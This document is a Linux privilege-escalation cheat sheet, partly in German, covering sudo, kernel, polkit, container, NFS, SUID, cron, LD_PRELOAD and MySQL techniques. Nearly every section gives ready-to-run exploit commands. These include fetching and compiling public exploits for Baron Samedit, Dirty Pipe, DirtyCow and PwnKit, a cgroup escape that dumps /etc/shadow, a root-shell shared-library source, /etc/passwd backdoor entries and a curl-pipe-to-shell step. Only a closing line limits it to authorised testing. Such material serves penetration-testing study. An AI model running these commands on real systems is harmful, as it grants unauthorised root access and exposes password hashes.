# Common CVE Privilege Escalation Exploits

## Sudo Vulnerabilities

### CVE-2021-3156 (Baron Samedit) ⭐⭐⭐

**Affected:** sudo < 1.9.5p2
**Impact:** Local Privilege Escalation to ROOT

**Check:**
```bash
sudo --version | head -1
sudoedit -s /
```

**Exploit:**
```bash
# Download
wget https://github.com/blasty/CVE-2021-3156/raw/main/hax.c
gcc hax.c -o exploit
./exploit

# Or
git clone https://github.com/worawit/CVE-2021-3156
cd CVE-2021-3156
make
./exploit
```

---

### CVE-2023-22809 (sudoedit bypass)

**Affected:** sudo 1.8.0 - 1.9.12p1
**Impact:** Privilege Escalation wenn sudoedit-Rechte vorhanden

**Check:**
```bash
sudo --version
sudo -l | grep sudoedit
```

**Exploit:**
```bash
# Wenn sudoedit Rechte für irgendeine Datei:
EDITOR="vim -- /etc/sudoers" sudoedit /erlaubte/datei

# In vim:
# Füge hinzu: username ALL=(ALL:ALL) NOPASSWD:ALL
# :wq

sudo su
```

**Details:** Siehe [url-encoding-reference.md]

---

### CVE-2019-14287 (Sudo Bypass)

**Affected:** sudo < 1.8.28
**Impact:** User ID -1 oder 4294967295 = root

**Check:**
```bash
sudo -l
# Wenn: (ALL, !root) ...
```

**Exploit:**
```bash
sudo -u#-1 /bin/bash
sudo -u#4294967295 /bin/bash
```

---

### CVE-2019-18634 (Sudo pwfeedback)

**Affected:** sudo < 1.8.26
**Impact:** Buffer overflow

**Exploit:**
```bash
git clone https://github.com/saleemrashid/sudo-cve-2019-18634
cd sudo-cve-2019-18634
make
./exploit
```

---

## Kernel Exploits

### CVE-2022-0847 (Dirty Pipe) ⭐⭐⭐

**Affected:** Linux Kernel 5.8 - 5.16.11, 5.15.25, 5.10.102
**Impact:** Arbitrary file overwrite → ROOT

**Check:**
```bash
uname -r
# Kernel 5.8 - 5.16.11?
```

**Exploit:**
```bash
wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c
gcc exploit.c -o exploit
./exploit
```

**Alternative:**
```bash
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
./exploit-1
```

---

### CVE-2016-5195 (DirtyCow) ⭐⭐⭐

**Affected:** Linux Kernel 2.6.22 - 4.8.3
**Impact:** Write to read-only files → ROOT

**Check:**
```bash
uname -r
# Kernel < 4.8.3?
```

**Exploit:**
```bash
# DirtyCow /etc/passwd
wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
# Password: [enter new password]
su firefart
```

**Alternative (SUID):**
```bash
wget https://www.exploit-db.com/raw/40839 -O cowroot.c
gcc cowroot.c -o cowroot -pthread
./cowroot
```

---

### CVE-2017-16995 (Ubuntu < 4.13)

**Affected:** Ubuntu 16.04 < 4.13
**Impact:** LPE to ROOT

**Exploit:**
```bash
wget https://www.exploit-db.com/raw/45010 -O exploit.c
gcc exploit.c -o exploit
./exploit
```

---

### CVE-2021-3493 (Ubuntu OverlayFS)

**Affected:** Ubuntu 20.10, 20.04 LTS, 18.04 LTS
**Impact:** LPE to ROOT

**Exploit:**
```bash
wget https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c
gcc exploit.c -o exploit
./exploit
```

---

### CVE-2022-2586 (nft_object UAF)

**Affected:** Kernel 5.8 - 5.18.14
**Impact:** Container escape / LPE

**Exploit:**
```bash
git clone https://github.com/Markakd/CVE-2022-2586
cd CVE-2022-2586
make
./exploit
```

---

## Polkit / pkexec

### CVE-2021-4034 (PwnKit) ⭐⭐⭐

**Affected:** polkit < 0.120
**Impact:** LPE to ROOT (jedes Linux System!)

**Check:**
```bash
which pkexec
pkexec --version
```

**Exploit:**
```bash
# C Version
wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
chmod +x PwnKit
./PwnKit

# Python Version
wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py
python3 CVE-2021-4034.py
```

**Manual:**
```bash
git clone https://github.com/arthepsy/CVE-2021-4034
cd CVE-2021-4034
make
./cve-2021-4034
```

---

## Docker / Container Escapes

### Docker Socket Mounted

**Check:**
```bash
ls -la /var/run/docker.sock
docker ps 2>/dev/null
```

**Exploit:**
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

### Docker Privileged Container

**Check:**
```bash
cat /proc/self/status | grep CapEff
# Wenn: CapEff: 0000003fffffffff = privileged
```

**Exploit:**
```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output
```

---

### CVE-2022-0847 (Dirty Pipe Container Escape)

```bash
# Same as kernel exploit but from container
```

---

## NFS Exploits

### no_root_squash ⭐

**Check auf Target:**
```bash
cat /etc/exports
showmount -e localhost
# Wenn: /share *(rw,no_root_squash)
```

**Exploit von Angreifer-Maschine:**
```bash
# Als root auf Angreifer:
mkdir /tmp/nfs
mount -t nfs TARGET_IP:/share /tmp/nfs
cd /tmp/nfs

# SUID bash erstellen
cp /bin/bash .
chmod +s bash

# Auf Target:
/share/bash -p
whoami  # root
```

---

## LXD/LXC Exploits

### LXD Group Membership

**Check:**
```bash
id | grep lxd
```

**Exploit:**
```bash
# Download Alpine image
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
bash build-alpine

# Transfer to target
# On target:
lxc image import ./alpine*.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

# In container:
cd /mnt/root/root
```

---

## SUID/Capabilities Exploits

### GTFOBins SUID

**Common SUID binaries:**

**vim:**
```bash
vim -c ':!/bin/bash'
```

**find:**
```bash
find . -exec /bin/bash -p \; -quit
```

**nmap (old):**
```bash
nmap --interactive
!sh
```

**python:**
```bash
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**cp:**
```bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
/tmp/bash -p
```

**Siehe:** https://gtfobins.github.io/

---

### Capabilities - cap_setuid

**Check:**
```bash
getcap -r / 2>/dev/null | grep cap_setuid
```

**Exploit (Python):**
```bash
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Exploit (Perl):**
```bash
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

---

## Path Hijacking

### Writable PATH directory

**Check:**
```bash
echo $PATH | tr ':' '\n'
find / -writable -type d 2>/dev/null | grep -E '^/(usr/)?s?bin'
```

**Exploit:**
```bash
# Wenn /tmp in PATH und SUID binary ruft 'ls' auf:
cd /tmp
echo '#!/bin/bash' > ls
echo '/bin/bash -p' >> ls
chmod +x ls
# Führe SUID binary aus
```

---

## Wildcard Injection

### tar wildcard

**Check:**
```bash
# Cron job mit: tar czf backup.tar.gz *
```

**Exploit:**
```bash
echo '#!/bin/bash' > shell.sh
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> shell.sh
chmod +x shell.sh

echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"

# Wait for cron
/tmp/bash -p
```

---

## LD_PRELOAD Exploitation

**Check:**
```bash
sudo -l
# Wenn: env_keep+=LD_PRELOAD
```

**Exploit:**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

**Compile & Run:**
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so find
```

---

## Cron Job Exploits

### Writable Cron Script

**Check:**
```bash
cat /etc/crontab
ls -la /etc/cron.*
find /etc/cron* -writable 2>/dev/null
```

**Exploit:**
```bash
# Wenn /path/to/script.sh writable:
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /path/to/script.sh

# Wait for cron
/tmp/rootbash -p
```

---

### Cron PATH Injection

**Check /etc/crontab:**
```
PATH=/home/user:/usr/local/bin:/usr/bin:/bin
* * * * * root backup.sh
```

**Exploit:**
```bash
# Erstelle in /home/user:
echo '#!/bin/bash' > /home/user/backup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /home/user/backup.sh
chmod +x /home/user/backup.sh

# Wait
/tmp/rootbash -p
```

---

## Password Cracking

### /etc/shadow readable
```bash
# Copy to attacker:
cat /etc/shadow > shadow.txt

# John
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt

# Hashcat
hashcat -m 1800 -a 0 shadow.txt rockyou.txt
```

### Writable /etc/passwd
```bash
openssl passwd -1 -salt salt password123
# $1$salt$qJH7.N4xYta3aEG/dfqo/0

echo 'hacker:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

---

## Service Exploits

### MySQL Running as Root

**Check:**
```bash
ps aux | grep mysql
# Wenn: root ... mysqld
```

**Exploit (UDF):**
```bash
# Login to MySQL
mysql -u root

# Create malicious UDF
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');

# Exit MySQL
/tmp/rootbash -p
```

---

## Quick CVE Check Commands

```bash
# System Info
uname -a
cat /etc/os-release

# Kernel Exploits
uname -r
searchsploit linux kernel $(uname -r)

# Sudo
sudo --version
sudo -l

# Polkit
pkexec --version
which pkexec

# Docker
id | grep docker
ls -la /var/run/docker.sock

# LXD
id | grep lxd

# NFS
cat /etc/exports

# SUID
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron
cat /etc/crontab
ls -la /etc/cron*

# Services
ps aux | grep root
netstat -tulpn
```

---

## Automated Scanners

### Linux Exploit Suggester
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
bash linux-exploit-suggester.sh
```

### LinPEAS
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### LinEnum
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
bash LinEnum.sh
```

---

**Nur für autorisierte Tests!** 🎯
